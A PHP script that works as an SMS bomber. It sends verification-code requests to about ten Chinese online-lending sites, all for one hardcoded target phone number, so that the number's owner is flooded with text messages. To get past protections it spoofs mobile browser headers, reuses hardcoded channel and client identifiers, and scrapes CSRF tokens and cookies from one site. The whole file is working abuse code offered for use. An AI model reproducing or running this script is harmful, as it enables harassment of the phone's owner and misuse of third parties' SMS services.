<?php

$phone = '170****';

class Sms
{
    private function _do_request($url, $params, $is_post = false, $headers = [])
    {
        if (!$is_post) {
            if ($params) {
                $p_str = '';
                $comma = '';
                foreach ($params as $k => $v) {
                    $p_str .= $comma . $k . '=' . $v;
                    $comma = '&';
                }

                $url = $url . '?' . $p_str;
            }
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        if (!empty($headers) && is_array($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }

        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        }
        $output = curl_exec($ch);
        if ($output === FALSE) {
            // error log
            throw new ErrorException("api|cURL Error: " . curl_error($ch));
        }
        curl_close($ch);

        $rs = json_decode($output, true);

        return $rs;
    }

    //借帮帮
    public function jiebangbang($phone)
    {
        $params = [
            'phoneNumber' => $phone,
            'channelCode' => 'aGse3e',
            'signTemplateId' => 'jbb',
        ];
        $url = 'https://api.jiebangbang.cn/manager/mgt/msgCode';
        return $this->_do_request($url, $params);
    }

    // 易贷钱庄
    public function jiugeji($phone)
    {
        $params = [
            'phone' => $phone,
        ];

        $url = "https://www.jiugeji.com/www/send-sms";
        return $this->_do_request($url, $params, true);
    }

    public function jiedianqian($phone)
    {
        $params = [
            'isLoading' => 'false',
            'deviceType' => 'MSite',
            'tokenID' => '',
            'mobile' => $phone,
            'captchaCode' => '',
            'codeLength' => '4'
        ];
        $url = 'https://m.jiedianqian.com/verify/account/send_verify_code.do';
        return $this->_do_request($url, $params);
    }

    public function getHtml($url, $httpHeader = [], $get_cookie = false)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($ch, $str) use (&$setcookie) {
            // 第一个参数是curl资源，第二个参数是每一行独立的header!
            list ($name, $value) = array_map('trim', explode(':', $str, 2));
            $name = strtolower($name);
            if ('set-cookie' == $name) {
                $setcookie[] = $value;
            }
            return strlen($str);
        });

        $html = curl_exec($ch);
        curl_close($ch);

        $cookie = array();
        foreach ($setcookie as $c) {
            $tmp = explode(";", $c);
            $cookie[] = $tmp[0];
        }
        $cookiestr = "Cookie: " . implode(";", $cookie);

        if ($get_cookie) {
            return [$html, $cookiestr];
        } else {
            $html;
        }
    }

    public function getCookie($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($ch, $str) use (&$setcookie) {
            // 第一个参数是curl资源，第二个参数是每一行独立的header!
            list ($name, $value) = array_map('trim', explode(':', $str, 2));
            $name = strtolower($name);
            if ('set-cookie' == $name) {
                $setcookie[] = $value;
            }
            return strlen($str);
        });
        curl_exec($ch);
        curl_close($ch);
        $cookie = array();
        foreach ($setcookie as $c) {
            $tmp = explode(";", $c);
            $cookie[] = $tmp[0];
        }
        $cookiestr = "Cookie:" . implode(";", $cookie);
        return $cookiestr;
    }


    public function suzhouzyc($phone)
    {
        $params = [
            'channel' => "kqsxd09",
            'client' => 'kuaiqd-1.0.0-ios-1.0.0',
            'mobile' => $phone,
            'type' => "reg"
        ];

        $url = 'https://kqd.suzhouzyc.cn/v2/user/smscode';
        return $this->_do_request($url, $params, true);
    }


    public function JinXiangHui($phone)
    {
        $headers = [
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
            'Referer: http://m.jinxianghui.net/?source=248',
            'X-Requested-With: XMLHttpRequest',
            'Origin: http://m.jinxianghui.net',
            'Host: m.jinxianghui.net',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
        ];

        $html = $this->getHtml('http://m.jinxianghui.net/?source=248', $headers, true);
        $headers[] = $html[1];

        preg_match_all('/crsf\:\ \'([\s\S]*?)\'\,/', $html[0], $crsf);
        preg_match_all('/uuid\:\ \'([\s\S]*?)\'\,/', $html[0], $uuid);

        $params = [
            '_crsf' => $crsf[1][1] ?? '',
            'phone' => $phone,
            'uuid' => $uuid[1][0] ?? '',
            'source' => "248",
        ];
        $url = 'http://m.jinxianghui.net/page/send';
        return $this->_do_request($url, $params, true, $headers);
    }

    public function HouPutech($phone) {
        $params = [
            'm' => $phone,
            'source' => "jlm",
            'c' => "ea484b7edff64accb2a37a02804864b0"
        ];

        $url = 'https://h5.houputech.com/LoanMarketJLM/PromotionSendSmsUnVerify';
        return $this->_do_request($url, $params, true); 
    }

    public function ArticleCard($phone){
        $params = [
            'phoneNum' => $phone,
        ];
        $url = 'https://lm.articlecard.com/app/user/sms_code_loan';

        return $this->_do_request($url, $params, true); 
    }

    public function GuanNiHua($phone) {
        $params = [
            'verify_code' => '',
            'verify_type' => '100',
            'os' => 10,
            'osv' => '10.3.1',
            'phone' => $phone,
            'client' => '67fa6691-3c60-0453-1e8e-50374506be69',
            'channel' => 'wuq12',
            'pname' => '201801050001',
            'scene' =>  30,
            'version' => '1.0'
        ];

        $url = 'https://guannihua.com/wap/verify_code';

        return $this->_do_request($url, $params, true);
    }

    public function QiuShiBai($phone){
        $params = [
            'Tel' => $phone
        ];

        $url = "http://jing.qiushibai.cn/Api/System/CheckUserByTel?format=json";

        $headers = [
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'
        ];
        return $this->_do_request($url, $params, true, $headers);
    }

    public function MaoMiDk($phone) {
        $params = [
            'verify_code' => '',
            'verify_type' => '100',
            'os' => 10,
            'osv' => '11.0',
            'phone' => $phone,
            'client' => '1b227a27-e267-c2b1-b04d-8425e7b1b643',
            'channel' => 'qw6',
            'pname' => '201903040000',
            'scene' =>  30,
            'version' => '1.0'
        ];

        $url = 'https://maomidk.com/maomidk/wap/verify_code';

        return $this->_do_request($url, $params, true);
    }

    public function send($phone)
    {
        $rs = $this->jiebangbang($phone);
        if ($rs['resultCode'] == '0') {
            echo "JieBangBang send success\n";
        } else {
            echo "JieBangBang send Error\n";
        }

        $rs = $this->jiugeji($phone);
        if ($rs == 'true') {
            echo "JiuGeJi send success\n";
        } else {
            echo "JiuGeJi send Error\n";
        }

        $rs = $this->jiedianqian($phone);

        $rs = $this->HouPutech($phone);

        if (isset($rs['Status']) && $rs['Status'] == '1') {
            echo "HouPutech send success\n";
        } else {
            echo "HouPutech send Error\n";
        }

        $rs = $this->ArticleCard($phone);

        if (isset($rs['errcode']) && $rs['errcode'] == '0') {
            echo "ArticleCard send success\n";
        } else {
            echo "ArticleCard send Error\n";
        }

        $rs = $this->suzhouzyc($phone);

        if (isset($rs['c']) && $rs['c'] == '200') {
            echo "SuZhouZyc send success\n";
        } else {
            echo "SuZhouZyc send Error\n";
        }

        $rs = $this->JinXiangHui($phone);

        if (isset($rs['code']) && $rs['code'] == '200') {
            echo "JinXiangHui send success\n";
        } else {
            echo "JinXiangHui send Error\n";
        }

        $rs = $this->GuanNiHua($phone);

        if (isset($rs['result']) && $rs['result'] == '200') {
            echo "GuanNiHua send success\n";
        } else {
            echo "GuanNiHua send Error\n";
        }

        $rs = $this->QiuShiBai($phone);

         if (isset($rs['result']) && $rs['result'] == '200') {
            echo "QiuShiBai send success\n";
        } else {
            echo "QiuShiBai send Error\n";
        }

         $rs = $this->MaoMiDk($phone);

         if (isset($rs['result']) && $rs['result'] == '200') {
            echo "MaoMiDk send success\n";
        } else {
            echo "MaoMiDk send Error\n";
        }
    }
}

$sms = new Sms();
$sms->send($phone);